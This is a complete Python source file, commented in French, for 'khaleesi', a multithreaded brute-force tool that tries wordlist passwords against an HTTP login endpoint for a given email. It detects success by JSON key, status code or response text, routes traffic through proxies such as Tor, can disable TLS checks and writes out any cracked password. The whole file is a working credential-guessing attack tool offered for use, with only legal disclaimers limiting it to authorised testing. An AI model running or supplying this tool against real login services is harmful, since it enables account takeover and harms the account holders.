#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
khaleesi.py — Outil de test de résistance des identifiants
(brute force) sur un endpoint d'authentification HTTP.

    « Khaleesi » : mère des dragons. Chaque thread est un dragon,
    et quand un mot de passe faible se présente... Dracarys. 🔥

⚠️  AVERTISSEMENT LÉGAL
    Cet outil est destiné exclusivement aux tests d'intrusion autorisés
    (votre propre infrastructure ou un mandat écrit du propriétaire).
    Toute utilisation non autorisée est illégale. L'auteur décline toute
    responsabilité en cas d'usage abusif.

Exemples d'utilisation
----------------------
Mode interactif (l'outil vous demande l'URL, l'email et le dictionnaire) :
    python3 khaleesi.py

Mode 100% CLI (pour scripts / CI) :
    python3 khaleesi.py \
        -u http://localhost:3000/api/auth/login \
        -e cible@exemple.com \
        -w /usr/share/wordlists/rockyou.txt \
        -t 10 --delay 0.1 -o rapport.json

Détection de succès personnalisée :
    python3 khaleesi.py -u ... -e ... -w ... \
        --success-key authenticated        # clé JSON de succès
    python3 khaleesi.py -u ... -e ... -w ... \
        --success-status 200               # code HTTP de succès
    python3 khaleesi.py -u ... -e ... -w ... \
        --body-template 'login=EMAIL&pass=PASSWORD' \
        --success-text 'welcome'           # corps non JSON / formulaire
"""

import argparse
import json
import os
import queue
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from urllib.parse import urlparse

import requests
import urllib3

__version__ = "2.0.0"
__author__ = "Steven"
TOOL_NAME = "khaleesi"

# --------------------------------------------------------------------------
# Affichage (couleurs ANSI)
# --------------------------------------------------------------------------


class C:
    """Codes couleur ANSI (désactivés si stdout n'est pas un TTY)."""
    ENABLED = sys.stdout.isatty()
    RESET = "\033[0m" if ENABLED else ""
    RED = "\033[91m" if ENABLED else ""
    GREEN = "\033[92m" if ENABLED else ""
    YELLOW = "\033[93m" if ENABLED else ""
    CYAN = "\033[96m" if ENABLED else ""
    BOLD = "\033[1m" if ENABLED else ""
    DIM = "\033[2m" if ENABLED else ""


_print_lock = threading.Lock()


def log(level: str, message: str) -> None:
    """Affiche une ligne horodatée, thread-safe."""
    colors = {"INFO": C.CYAN, "OK": C.GREEN, "WARN": C.YELLOW, "ERR": C.RED, "FAIL": C.DIM}
    color = colors.get(level, "")
    with _print_lock:
        stamp = datetime.now().strftime("%H:%M:%S")
        sys.stdout.write(f"{C.DIM}[{stamp}]{C.RESET} {color}[{level:<4}]{C.RESET} {message}\n")


def progress(line: str) -> None:
    """Met à jour la ligne de progression (une seule ligne du terminal)."""
    with _print_lock:
        sys.stdout.write("\r" + line.ljust(110)[:110])
        sys.stdout.flush()


def clear_progress() -> None:
    with _print_lock:
        sys.stdout.write("\r" + " " * 110 + "\r")


# --------------------------------------------------------------------------
# Analyse des arguments + mode interactif
# --------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description=(
            "Test de résistance des identifiants (brute force) sur un endpoint "
            "d'authentification. À utiliser UNIQUEMENT sur des systèmes dont "
            "vous avez l'autorisation de test."
        ),
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog=f"{TOOL_NAME} v{__version__} — usage autorisé uniquement.",
    )
    p.add_argument("-u", "--url", help="URL complète de l'endpoint de login (ex: http://host:3000/api/auth/login)")
    p.add_argument("-e", "--email", help="Identifiant (email / login) à tester")
    p.add_argument("-w", "--wordlist", help="Chemin du dictionnaire (une candidature par ligne)")
    p.add_argument("-t", "--threads", type=int, default=1,
                   help="Nombre de threads simultanés (default: %(default)s)")
    p.add_argument("--delay", type=float, default=0.0, metavar="SEC",
                   help="Pause entre chaque requête par thread (default: %(default)s)")
    p.add_argument("--timeout", type=float, default=10.0, metavar="SEC",
                   help="Timeout de chaque requête HTTP (default: %(default)s)")
    p.add_argument("--max-attempts", type=int, default=0, metavar="N",
                   help="Limiter le nombre de candidats testés (0 = tout, default: %(default)s)")
    p.add_argument("--start-line", type=int, default=1, metavar="N",
                   help="Reprendre à partir de la ligne N du dictionnaire (default: %(default)s)")

    # Détection de succès
    g = p.add_argument_group("détection de succès")
    g.add_argument("--success-key", default="success", metavar="KEY",
                   help="Clé JSON dont la valeur vraie indique un succès ('' pour désactiver, default: %(default)s)")
    g.add_argument("--fail-key", default="", metavar="KEY",
                   help="Clé JSON dont la valeur vraie indique un échec (default: %(default)s)")
    g.add_argument("--success-status", type=int, default=None, metavar="CODE",
                   help="Code HTTP considéré comme succès (default: aucun)")
    g.add_argument("--success-text", default="", metavar="STR",
                   help="Chaîne à chercher dans le corps de la réponse (default: %(default)s)")

    # Requête personnalisée
    g = p.add_argument_group("requête personnalisée")
    g.add_argument("--method", default="POST", help="Méthode HTTP (default: %(default)s)")
    g.add_argument("--field-email", default="email", metavar="NAME",
                   help="Nom du champ JSON de l'identifiant (default: %(default)s)")
    g.add_argument("--field-password", default="password", metavar="NAME",
                   help="Nom du champ JSON du mot de passe (default: %(default)s)")
    g.add_argument("--body-template", default="", metavar="TPL",
                   help="Corps brut avec placeholders {EMAIL} et {PASSWORD} (surcharge le JSON par défaut)")
    g.add_argument("-H", "--header", action="append", default=[], metavar="\"K: V\"",
                   help="En-tête HTTP supplémentaire (répétable)")
    p.add_argument("--user-agent", default=f"{TOOL_NAME}/{__version__}", help="User-Agent (default: %(default)s)")
    p.add_argument("--proxy", action="append", default=[], metavar="URL",
                   help="Proxy HTTP(S) ou SOCKS (répétable, ex: socks5://127.0.0.1:9050)")
    p.add_argument("--insecure", action="store_true", help="Désactiver la vérification TLS")

    # Comportement / sortie
    g = p.add_argument_group("comportement & sortie")
    g.add_argument("-o", "--output", metavar="FILE", help="Rapport de résultat au format JSON")
    g.add_argument("--stop-on-errors", type=int, default=10, metavar="N",
                   help="Abandonner après N erreurs réseau/HTTP consécutives "
                        "(détection de rate-limiting ou blocage ; 0 = illimité, default: %(default)s)")
    p.add_argument("--quiet", action="store_true", help="Masquer les lignes de progression")
    p.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    return p


def prompt_if_missing(args: argparse.Namespace) -> None:
    """Demande à l'utilisateur les valeurs manquantes (mode interactif)."""
    print(f"\n{C.BOLD}{TOOL_NAME} v{__version__}{C.RESET} — {C.YELLOW}test de résistance des identifiants{C.RESET}")
    print(f"{C.RED}Rappel : à utiliser uniquement sur un système que vous êtes autorisé à tester.{C.RESET}\n")
    if not args.url:
        args.url = input("URL de l'endpoint de login (ex: http://localhost:3000/api/auth/login) : ").strip()
    if not args.email:
        args.email = input("Identifiant / email à tester : ").strip()
    if not args.wordlist:
        args.wordlist = input("Chemin du dictionnaire (ex: /usr/share/wordlists/rockyou.txt) : ").strip()
        if os.path.exists(args.wordlist):
            try:
                total = sum(1 for _ in open(args.wordlist, "rb"))
                print(f"{C.DIM}[i] Dictionnaire trouvé : {total} lignes.{C.RESET}")
            except OSError:
                pass


def validate_args(args: argparse.Namespace) -> None:
    if not args.url or not args.wordlist or not args.email:
        log("ERR", "URL, identifiant et dictionnaire sont obligatoires (-u / -e / -w).")
        sys.exit(2)
    parsed = urlparse(args.url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        log("ERR", f"URL invalide : {args.url!r} (doit commencer par http:// ou https://).")
        sys.exit(2)
    if not os.path.isfile(args.wordlist):
        log("ERR", f"Dictionnaire introuvable : {args.wordlist}")
        sys.exit(2)
    if args.threads < 1 or args.threads > 256:
        log("ERR", "Le nombre de threads doit être entre 1 et 256.")
        sys.exit(2)
    if args.stop_on_errors < 0:
        log("ERR", "--stop-on-errors doit être positif.")
        sys.exit(2)
    if args.body_template and ("{PASSWORD}" not in args.body_template):
        log("ERR", "--body-template doit contenir le placeholder {PASSWORD}.")
        sys.exit(2)

    headers = {}
    for h in args.header:
        if ":" not in h:
            log("ERR", f"En-tête invalide (format attendu \"Clé: Valeur\") : {h}")
            sys.exit(2)
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()
    args.extra_headers = headers

    args.proxies = {}
    if args.proxy:
        for prx in args.proxy:
            args.proxies.setdefault("http", prx)
            args.proxies.setdefault("https", prx)
        if args.insecure:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# --------------------------------------------------------------------------
# Détection de succès
# --------------------------------------------------------------------------


def is_success(status: int, body: str, args: argparse.Namespace) -> bool:
    """Décide si une réponse correspond à une authentification réussie."""
    # 1) Clé JSON de succès
    if args.success_key:
        try:
            data = json.loads(body) if body else None
        except (json.JSONDecodeError, ValueError):
            data = None
        if isinstance(data, dict):
            if args.fail_key and data.get(args.fail_key):
                return False
            if data.get(args.success_key):
                return True
            if args.success_status is None and args.success_text == "":
                return False  # réponse JSON sans la clé attendue -> échec
    # 2) Code HTTP de succès
    if args.success_status is not None and status == args.success_status:
        return True
    # 3) Chaîne dans le corps
    if args.success_text and args.success_text in body:
        return True
    return False


# --------------------------------------------------------------------------
# Moteur de test
# --------------------------------------------------------------------------


class Stats:
    """Compteurs partagés entre threads."""

    def __init__(self, total: int, stop_on_errors: int = 0):
        self.lock = threading.Lock()
        self.total = total
        self.stop_on_errors = stop_on_errors
        self.attempts = 0
        self.errors = 0
        self.consecutive_errors = 0
        self.found = None       # (password, line_number, status)
        self.last_status = None
        self.stop = threading.Event()

    def tick(self, status: int, ok: bool, error: bool = False,
             found: tuple | None = None) -> None:
        """error=True uniquement pour une erreur transport/serveur (pas un échec de login)."""
        with self.lock:
            self.attempts += 1
            self.last_status = status
            if ok:
                self.consecutive_errors = 0
            elif error:
                self.errors += 1
                self.consecutive_errors += 1
            else:
                self.consecutive_errors = 0
            if found and self.found is None:
                self.found = found

    def should_stop(self) -> bool:
        with self.lock:
            if self.found or self.stop.is_set():
                return True
            if self.stop_on_errors and self.consecutive_errors >= self.stop_on_errors:
                self.stop.set()
                return True
            return False


def load_wordlist(path: str, start_line: int, max_attempts: int) -> list[str]:
    """Charge le dictionnaire en mémoire (dédupliqué, lignes vides ignorées)."""
    seen, words = set(), []
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for i, raw in enumerate(fh, 1):
            if i < start_line:
                continue
            pw = raw.rstrip("\r\n")
            if not pw or pw in seen:
                continue
            seen.add(pw)
            words.append(pw)
            if max_attempts and len(words) >= max_attempts:
                break
    return words


def make_session(args: argparse.Namespace) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "application/json, text/plain, */*",
        "Connection": "keep-alive",
    })
    s.headers.update(args.extra_headers)
    s.proxies.update(args.proxies)
    s.verify = not args.insecure
    return s


def build_request(args: argparse.Namespace, password: str):
    """Construit (url, kwargs) pour un candidat donné."""
    if args.body_template:
        body = args.body_template.replace("{EMAIL}", args.email).replace("{PASSWORD}", password)
        kwargs = {"data": body}
    else:
        kwargs = {"json": {args.field_email: args.email, args.field_password: password}}
    return args.url, kwargs


def worker(worker_id: int, words_q: "queue.Queue[tuple[int, str]]", stats: Stats,
           args: argparse.Namespace, session: requests.Session) -> None:
    while not stats.should_stop():
        try:
            lineno, password = words_q.get_nowait()
        except queue.Empty:
            return
        try:
            url, kwargs = build_request(args, password)
            r = session.request(args.method, url, timeout=args.timeout, **kwargs)
            ok = is_success(r.status_code, r.text, args)
            server_issue = r.status_code >= 500 or r.status_code == 429
            stats.tick(r.status_code, ok, error=server_issue,
                       found=(password, lineno, r.status_code) if ok else None)
            if ok:
                stats.stop.set()
            elif r.status_code in (429, 503):
                log("WARN", f"Réponse {r.status_code} — possible rate-limiting, réduisez la vitesse (-t/--delay).")
            if not args.quiet and C.ENABLED and worker_id == 0:
                pct = stats.attempts * 100 / stats.total if stats.total else 0
                progress(f"[{pct:5.1f}%] {stats.attempts}/{stats.total} essais — dernier statut HTTP {stats.last_status}")
        except requests.RequestException as exc:
            stats.tick(0, ok=False, error=True)
            log("ERR", f"Requête échouée ({exc.__class__.__name__}) : {exc}")
            time.sleep(1.0)  # backoff simple en cas d'erreur réseau
        finally:
            words_q.task_done()
            if args.delay:
                time.sleep(args.delay)


def run(args: argparse.Namespace) -> int:
    words = load_wordlist(args.wordlist, args.start_line, args.max_attempts)
    total = len(words)
    if total == 0:
        log("ERR", "Dictionnaire vide (ou plage --start-line/--max-attempts vide).")
        return 2
    log("INFO", f"Cible   : {args.url}")
    log("INFO", f"Compte  : {args.email}")
    log("INFO", f"Dico    : {args.wordlist} ({total} candidats, démarrage ligne {args.start_line})")
    log("INFO", f"Config  : {args.threads} thread(s), timeout {args.timeout}s, délai {args.delay}s")

    stats = Stats(total, args.stop_on_errors)
    q: "queue.Queue[tuple[int, str]]" = queue.Queue()
    for item in enumerate(words, args.start_line):
        q.put(item)

    start = time.time()
    sessions = [make_session(args) for _ in range(args.threads)]
    try:
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            for i in range(args.threads):
                pool.submit(worker, i, q, stats, args, sessions[i])
    except KeyboardInterrupt:
        clear_progress()
        log("WARN", "Interruption clavier — arrêt demandé...")
        stats.stop.set()
        return 130
    clear_progress()
    elapsed = time.time() - start

    rate = stats.attempts / elapsed if elapsed else 0.0
    log("INFO", f"Terminé en {elapsed:.2f}s — {stats.attempts} requêtes ({rate:.1f} req/s), {stats.errors} erreur(s).")

    if stats.found:
        password, lineno, status = stats.found
        log("OK", f"SUCÈS : mot de passe trouvé '{password}' "
                 f"(ligne {lineno}, statut HTTP {status}, {elapsed:.2f}s)")
        if args.output:
            write_report(args, stats, password, lineno, elapsed, total)
        return 0

    log("WARN", "Aucun mot de passe trouvé dans ce dictionnaire.")
    if stats.stop.is_set() and not stats.found:
        log("ERR", f"Arrêt anticipé : {args.stop_on_errors} erreurs consécutives "
                   "(cible injoignable, bloquée ou rate-limiting).")
        if args.output:
            write_report(args, stats, None, None, elapsed, total)
        return 3
    if args.output:
        write_report(args, stats, None, None, elapsed, total)
    return 1


def write_report(args: argparse.Namespace, stats: Stats, password, lineno, elapsed: float, total: int) -> None:
    """Écrit le rapport JSON final."""
    report = {
        "tool": TOOL_NAME,
        "version": __version__,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_url": args.url,
        "identifier": args.email,
        "wordlist": args.wordlist,
        "candidates_total": total,
        "attempts": stats.attempts,
        "errors": stats.errors,
        "threads": args.threads,
        "duration_seconds": round(elapsed, 2),
        "success": bool(stats.found),
        "found_password": password,
        "found_line": lineno,
        "stopped_early": stats.stop.is_set() and not stats.found,
    }
    try:
        with open(args.output, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=2, ensure_ascii=False)
        log("INFO", f"Rapport écrit : {args.output}")
    except OSError as exc:
        log("ERR", f"Impossible d'écrire le rapport {args.output} : {exc}")


def main() -> int:
    title = f"{TOOL_NAME} v{__version__} — mère des dragons".center(46)
    banner = f"""
{C.CYAN}╔══════════════════════════════════════════════╗
║{C.BOLD}{title}{C.RESET}{C.CYAN}║
╚══════════════════════════════════════════════╝{C.RESET}"""
    print(banner)
    args = build_parser().parse_args()
    prompt_if_missing(args)
    validate_args(args)
    return run(args)


if __name__ == "__main__":
    sys.exit(main())
